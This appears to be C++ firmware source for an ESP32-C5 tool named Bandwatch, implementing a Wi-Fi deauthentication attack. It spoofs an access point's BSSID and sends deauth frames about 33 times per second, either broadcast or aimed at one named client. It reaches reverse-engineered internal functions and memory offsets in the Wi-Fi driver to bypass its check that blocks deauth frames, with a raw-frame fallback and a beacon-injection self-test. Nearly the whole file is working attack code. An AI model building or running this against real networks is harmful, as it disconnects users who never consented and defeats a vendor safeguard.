// Deauth attack + diagnostics for Bandwatch: spoof a BSSID and blast deauth frames until stopped or the
// dead-man's switch fires. The normal path drives the driver's own frame builder through reverse-engineered
// libnet80211.a offsets (core-version-pinned, see below); the raw-TX fallback covers the case where no slot
// is up. Toggled from the host with "deauth <bssid>".
#include "bandwatch_core.h"

#include <esp_wifi.h>   // esp_wifi_80211_tx / esp_wifi_set_max_tx_power

Deauth deauth;   // type in bandwatch_core.h

// DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
volatile bool txTestActive = false;
uint32_t txTestSent = 0, txTestFail = 0;
// PROOF OF CONCEPT ONLY (not a feature): raw TX radiates nothing from an unassociated STA, so this brings
// up a SoftAP to give the MAC a real BSS context and injects from WIFI_IF_AP instead. Toggled with
// "softap 1". Tears down promiscuous sniffing while active — see docs/DEVELOPER.md section 11.
wifi_interface_t txIface = WIFI_IF_STA;
// DIAGNOSTIC (§11): FC byte0 written on the internal kick path. 0xC0 = deauth (the real attack). Set to
// 0x80 with "kickfc 80" to send a beacon down the SAME descriptor path: the witness then tells us whether
// that path radiates at all, separating "internal path is dead" from "deauth subtype is dropped".
volatile uint8_t kickFc = 0xC0;
// DIAGNOSTIC (§11): the internal slot path is preferred whenever a slot exists, so the raw
// esp_wifi_80211_tx fallback normally never runs and has never been measured on this silicon.
// "kickpath 1" forces it so the witness can say what that path actually does.
volatile bool forceRawKick = false;
bool softApPoc = false;

// DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
// header. send_deauth_no_bss builds a deauth frame with the driver's own encoding (FC low byte 0xC0,
// i.e. a real "deauth" subtype on air) and TXes it via ic_tx_pkt, bypassing the raw-TX sanity check
// that rejects our hand-rolled [C0]/[A0] frames.
//   arg0: pointer to a word holding an ieee80211com* — g_ic+16 (STA) or g_ic+20 (AP); it panics on 0
//   arg1: target MAC (the station being kicked, ends up as DA), arg2: reason code
//
// Every numeric offset used by this path (g_ic+16/+20/+436/+440, hmac+312, desc+4/+20/+40/+52/+56) was
// reverse-engineered from the prebuilt libnet80211.a in Arduino-ESP32 core 3.3.11 (ESP-IDF 5.5.5). Nothing
// validates them at runtime, so a core that lays those structs out differently turns these reads and writes
// into memory corruption rather than a clean failure. Re-verify them before bumping the core (docs/DEVELOPER.md §9).
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR != 3 || ESP_ARDUINO_VERSION_MINOR != 3)
#warning "Arduino-ESP32 core is not 3.3.x: the driver-internal deauth offsets may no longer match (docs/DEVELOPER.md)."
#endif
extern "C" {
    int ieee80211_send_deauth_no_bss(void* hmacSlot, const uint8_t* mac, uint16_t reason);
    // DIAGNOSTIC build 3 pieces — the driver builds the frame itself; we only steer which MACs go where.
    void* ieee80211_alloc_deauth(void* hmacSlot, const uint8_t* macArg1, uint16_t reason);   // desc w/ reason at D+24, or NULL
    void  ieee80211_send_setup(void* hmacSlot, void* desc, int x, int y, const uint8_t* m4, const uint8_t* m5, const uint8_t* m6);
    void  ieee80211_set_tx_desc(void* hmacSlot, void* desc, int a, int b, int c);
    void  ic_tx_pkt(void* desc);
    extern void* g_ic;
}

// Shared prologue for both attack modes: latch the driver's hmac slot and the state byte that decides the
// DA/SA/BSSID mapping inside send_setup. Callers hold g_devMux.
//
// slotWord being 0 means neither the STA nor the AP interface has an ieee80211com yet (Wi-Fi not up, or a
// core whose layout these offsets do not describe). Dereferencing it read address 0x138 and panicked;
// serviceDeauth() already treats a zero slot as "fall back to raw TX", so record it and let it.
static void latchDeauthSlot() {
    // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
    // not fields of the ic struct itself.
    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac
    if (!slotWord) {
        slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP

        // DIAGNOSTIC: Log fallback to AP path every time
        if (serialRoom(70))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start FALLBACK to AP slot\"}\n");
    }
    memcpy(deauth.slotPad, &slotWord, 4);
    deauth.hstate = slotWord ? *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312) : 0xFF;

    // DIAGNOSTIC: Log hstate value once at start (critical for understanding address mapping)
    if (serialRoom(90))
        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start hstate=0x%02x slot=0x%x\"}\n",
                     deauth.hstate, slotWord);
}

// The channel a BSSID was last heard on, or 0. Callers hold g_devMux: the Wi-Fi task memsets slots in
// trackWifiDevice, so an unlocked walk can read a half-rewritten entry.
static int channelOfBssid(const uint8_t* bssid) {
    for (int i = 0; i < kWifiDevSlots; i++)
        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, bssid)) return wifiDevs[i].ch;
    return 0;
}

// Park on the AP's last-seen channel when we know it, so the frames actually land.
void startDeauth(const uint8_t* mac) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(deauth.bssid, mac, 6);
    memset(deauth.targetMac, 0, 6);   // clear any previous targeted mode
    deauth.targeted = false;
    const int ch = channelOfBssid(mac);
    deauth.sent = 0;
    deauth.txFail = 0;
    deauth.startMs = millis();
    deauth.dumped = false;
    latchDeauthSlot();
    deauth.active = true;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
    if (deauth.parked) setPark(-1);                    // restart of a running attack: re-park below
    deauth.parked = false;
    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauth.parked = true; } }
}

// Targeted deauth ("dca"): kick one named station off one named AP. Both MACs come from the host; the AP's
// is what we spoof and park on, the client's becomes the DA of every frame.
void startDeauthTargeted(const uint8_t* clientMac, const uint8_t* apBssid) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(deauth.bssid, apBssid, 6);
    memcpy(deauth.targetMac, clientMac, 6);
    deauth.targeted = true;
    const int ch = channelOfBssid(apBssid);   // the AP's channel, not the client's
    deauth.sent = 0;
    deauth.txFail = 0;
    deauth.startMs = millis();
    deauth.dumped = false;
    latchDeauthSlot();
    deauth.active = true;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(160);
    if (deauth.parked) setPark(-1);
    deauth.parked = false;
    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauth.parked = true; } }
}

void stopDeauth() {
    if (!deauth.active) return;
    portENTER_CRITICAL(&g_devMux);
    deauth.active = false;
    deauth.targeted = false;
    memset(deauth.targetMac, 0, 6);
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's quiet-sniffing level (startDeauth raised it to 16 dBm)
    // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
    if (deauth.parked) { setPark(-1); deauth.parked = false; }
}

namespace {   // Deauth TX fallback; serviceDeauth() breaks out below to be reachable from uiTimerCb

// Deauth TX fallback, used only when the driver-internal slot (sendInternalKick) is unavailable. One
// deauth/disassoc MPDU (26 bytes), DA broadcast so every station on the BSS hears it, SA/BSSID = the AP
// we spoof. Raw frames go out through esp_wifi_80211_tx (the older esp_wifi_send_mgmt_frame API is not
// exposed by the C5's public headers).
//
// NOTE: the C5's ieee80211_raw_frame_sanity_check in libnet80211.a rejects deauth/disassoc subtypes, so
// this path is expected to fail with ESP_ERR_INVALID_ARG and show up in the `df` counter. It previously
// sent [0x80,0x03] / [0xD0,0x04] to get *past* that check, but those are Beacon and Action frames: they
// are accepted by the driver and then ignored by every station, i.e. the check was being satisfied with
// frames that could never kick anyone. Failing visibly beats succeeding at nothing — the real attack path
// is sendInternalKick(), which bypasses the sanity check entirely.
void sendKickFrame(const uint8_t* bssid, bool disassoc) {
    static uint32_t seq = 0;
    const uint8_t fc0 = disassoc ? 0xA0 : 0xC0;   // subtype 10 disassoc / 12 deauth, type 0 management
    const uint8_t fc1 = 0x00;                     // management frames carry no ToDS/FromDS
    uint8_t f[26];
    f[0] = fc0;                                    // accepted by the C5 raw-TX sanity check (see above)
    f[1] = fc1;                                    // deauth / disassociation subtype
    f[2] = 0x3A; f[3] = 0x01;                      // duration (both working deauther templates use a non-zero value here)
    // DA: broadcast kicks every station on the BSS; in targeted mode only the one station we were given.
    // The fallback has to honour that too — a "kick this laptop" that quietly drops the whole network
    // because the internal slot was unavailable is worse than one that does nothing.
    if (deauth.targeted) memcpy(&f[4], deauth.targetMac, 6);
    else                 memset(&f[4], 0xFF, 6);
    memcpy(&f[10], bssid, 6);                      // SA and...
    memcpy(&f[16], bssid, 6);                      // ...BSSID: the AP we are spoofing
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;   // mgmt seq control, low nibble reserved
    f[22] = static_cast<uint8_t>(s);
    f[23] = static_cast<uint8_t>(s >> 8);
    f[24] = 0x07; f[25] = 0x00;                    // reason: class-3 frame from non-assoc STA
    const esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    if (e == ESP_OK) deauth.sent = deauth.sent + 1;
    else deauth.txFail = deauth.txFail + 1;
    if (e != ESP_OK && (deauth.txFail & 31u) == 0 && serialRoom(160))   // failures every 32nd, not a storm
        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth tx: %s\"}\n", esp_err_to_name(e));
}

// DIAGNOSTIC: beacon injection, used to answer "can this radio transmit at all in promiscuous mode?".
// Beacons (FC 0x80) are the one subtype the C5's raw-TX sanity check is known to accept, so if a scan from
// another device cannot see this SSID, nothing we send is reaching the air and the deauth frame content is
// beside the point. Toggled with "txtest 1" / "txtest 0"; transmits on whatever channel we are parked on.
void sendTestBeacon() {
    static const uint8_t kSrc[6] = {0x02, 0xBA, 0xAD, 0xBE, 0xEF, 0x01};
    static const char kSsid[] = "BANDWATCH-TXTEST";
    static uint32_t seq = 0;
    uint8_t f[64];
    int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                       // beacon
    f[n++] = 0x00; f[n++] = 0x00;                       // duration
    memset(&f[n], 0xFF, 6); n += 6;                     // DA broadcast
    memcpy(&f[n], kSrc, 6); n += 6;                     // SA
    memcpy(&f[n], kSrc, 6); n += 6;                     // BSSID
    const uint32_t s = ((++seq) & 0x0FFFu) << 4;
    f[n++] = static_cast<uint8_t>(s); f[n++] = static_cast<uint8_t>(s >> 8);
    memset(&f[n], 0, 8); n += 8;                        // timestamp
    f[n++] = 0x64; f[n++] = 0x00;                       // beacon interval 100 TU
    f[n++] = 0x01; f[n++] = 0x00;                       // capability: ESS
    f[n++] = 0; f[n++] = sizeof(kSsid) - 1;             // SSID IE
    memcpy(&f[n], kSsid, sizeof(kSsid) - 1); n += sizeof(kSsid) - 1;
    f[n++] = 1; f[n++] = 4;                             // supported rates
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
    f[n++] = 3; f[n++] = 1; f[n++] = currentChannelNum; // DS parameter set
    const esp_err_t e = esp_wifi_80211_tx(txIface, f, n, false);
    if (e == ESP_OK) txTestSent++;
    else {
        txTestFail++;
        if ((txTestFail & 31u) == 1 && serialRoom(160))
            Serial.printf("{\"t\":\"log\",\"msg\":\"txtest tx: %s\"}\n", esp_err_to_name(e));
    }
}

extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on the STA's home channel

// Drive the driver's own deauth frame construction (same helpers an AP uses to kick a station), so the
// bytes are exactly what this chip family emits. The driver writes FC=[0xC0,x] plus duration/seq; we steer
// the three address slots so SA=BSSID=the AP in every send_setup branch and DA is whoever we are kicking —
// broadcast, or the one station in targeted mode (hstate 0 puts A6→DA, hstates 1/3 put A4/A6→SA/BSSID):
//   hstate==0: A4=AP(SA)  A5=DA(BSSID-ish) A6=DA
//   else:      A4=A6=AP   A5=DA
void sendInternalKick() {
    static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    // DIAGNOSTIC: Count each allocation attempt vs successful completion (helps determine if alloc fails)
    static uint32_t allocCount = 0;
    ++allocCount;
    
    void* desc = ieee80211_alloc_deauth(deauth.slotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
    if (!desc) { 
        deauth.txFail = deauth.txFail + 1; 
        
        // DIAGNOSTIC: Log allocation failure pattern (every 50th time to avoid spam)
        if ((allocCount & 63u) == 0 && serialRoom(80))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth alloc fail #%lu hstate=0x%02x\"}\n", 
                         allocCount, deauth.hstate);
        return; 
    }
    // Mirror send_deauth_no_bss's ebuf-header bit juggling: desc[+4] holds the ebuf pointer P, and the
    // bits live in the first word P points at. A 0 here means this core's descriptor layout is not the one
    // these offsets were derived from: bail instead of dereferencing it, and instead of TXing a frame we
    // could not patch (the spoofed SA/BSSID is written through P below).
    const uint32_t P = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4);
    if (!P) { 
        deauth.txFail = deauth.txFail + 1; 
        
        // DIAGNOSTIC: Log invalid pointer every 50th time
        if ((allocCount & 63u) == 0 && serialRoom(80))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth alloc #%lu P=0 null hstate=0x%02x\"}\n", 
                         allocCount, deauth.hstate);
        return; 
    }
    {
        volatile uint32_t* ebw = reinterpret_cast<volatile uint32_t*>(P);
        uint32_t v = *ebw;
        v |= 0x80000u | 0x40000u;
        v &= ~0xE0000u;
        v &= 0xFFFFF000u;
        v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
        *ebw = v;
    }
    // Broadcast mode kicks every station; targeted mode puts the one station in the DA slot instead.
    const uint8_t* daMac = deauth.targeted ? deauth.targetMac : kBcastMac;
    ieee80211_send_setup(deauth.slotPad, desc, 192, 16,
                         deauth.bssid,                                     // A4 → SA in every branch (the AP we spoof)
                         daMac,                                            // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
                         deauth.hstate == 0 ? daMac : deauth.bssid);       // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
    ieee80211_set_tx_desc(deauth.slotPad, desc, 7, 16, 0);
    const uint32_t d56 = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 56);
    if (d56) {
        *reinterpret_cast<volatile uint32_t*>(d56 + 20) |= 4;   // the same state bit send_deauth_no_bss flips
        *reinterpret_cast<volatile uint32_t*>(d56) |= 1;        // robust-mgmt flag (get_robustmgtframe's bit — WPA2 stations can demand it)
    }
    // Frame data D sits at *(P+4) (same double-deref as above), and desc[+40]&2 shifts all addresses by +8.
    uint8_t* D = reinterpret_cast<uint8_t*>(*reinterpret_cast<volatile uint32_t*>(P + 4));
    if (D) {
        const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
        // hstate-0 branch puts the DA in the BSSID slot → patch so SA==BSSID like a real AP kick. The DA
        // itself is already correct: send_setup's A6 argument carried it above.
        if (deauth.hstate == 0)
            memcpy(D + 16 + off, deauth.bssid, 6);
        // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
        // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
        // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
        D[off] = kickFc;  D[1 + off] = 0x00;   // DIAGNOSTIC: subtype overridable, see kickFc above
        D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
        
        // CRITICAL FIX: Set unique sequence number per frame - without this all frames appear as duplicates
        // Match the pattern from sendKickFrame: seq occupies bits 7-4 of byte 23 (high nibble)
        static uint32_t frameSeq = 0;
        const uint32_t s = ((frameSeq & 0x0FFFu) << 4);   // shift left 4 bits
        D[off + 22] = static_cast<uint8_t>(s >> 4);       // byte 22 gets low 8 bits of shifted value
        D[off + 23] = static_cast<uint8_t>(s & 0xF0);     // byte 23 gets high nibble
        ++frameSeq;                                       // increment for next frame (sequence wraps at 4095)

                // DIAGNOSTIC: Log sequence number periodically (every 4th frame uses less buffer space than full dump)
        static uint32_t seqLogCount = 0;
        if ((seqLogCount & 3u) == 0 && serialRoom(60)) {
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth seq=0x%02x%02x #%lu\"}\n", 
                         D[off + 22], D[off + 23], frameSeq - 1);

        }
    }
    *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
    
    // DIAGNOSTIC: Track TX path decision and completion count
    static uint32_t txPathLog = 0;
    bool goingToDeferred = !chm_is_at_home_channel();
    if (goingToDeferred) {
        char** tailSlot = reinterpret_cast<char**>(reinterpret_cast<char*>(&g_ic) + 440);
        *reinterpret_cast<volatile uint32_t*>(reinterpret_cast<char*>(desc) + 52) = 0;
        *reinterpret_cast<volatile uint32_t*>(*tailSlot) = reinterpret_cast<uint32_t>(desc);
        *tailSlot = reinterpret_cast<char*>(desc) + 52;
        
        // Log deferred queue decision every 20th frame to verify path taken
        if ((txPathLog & 15u) == 0 && serialRoom(60))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth #%lu DEFERRED q=0x%lx\"}\n", 
                         txPathLog, *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
    } else {
        if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
        
        // Log immediate TX every 16th frame
        if ((txPathLog & 15u) == 0 && serialRoom(40))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth #%lu IMMEDIATE home=1\"}\n", 
                         txPathLog);
    }
    ++txPathLog;
    deauth.sent = deauth.sent + 1;
}

} // namespace

// Called from uiTimerCb (~120 ms): four frames per tick ≈ 33/s — enough to drop a network,
// polite enough not to blank the whole street.
void serviceDeauth() {
    if (txTestActive && wifiRunning) { for (int k = 0; k < 4; k++) sendTestBeacon(); }
    if (!deauth.active || !wifiRunning) return;
    if (millis() - deauth.startMs > kDeauthMaxMs) {   // dead-man's switch: host/serial link may have dropped
        if (serialRoom(120))
            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth auto-stopped after %lus\"}\n",
                          static_cast<unsigned long>(kDeauthMaxMs / 1000));
        stopDeauth();
        return;
    }
    if (!forceRawKick && *(const uint32_t*)deauth.slotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
        for (int k = 0; k < 4; k++) sendInternalKick();
    } else {
        for (int k = 0; k < 4; k++) sendKickFrame(deauth.bssid, false);   // no slot: fall back to raw [80] kicks
    }
    if (deauth.sent == 4 && serialRoom(160))   // one report after the first burst: home-channel flag + deferred-TX queue words (g_ic+436/+440)
        Serial.printf("{\"t\":\"log\",\"msg\":\"home %d q %lx/%lx\"}\n", chm_is_at_home_channel(),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 436),
                      *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
}
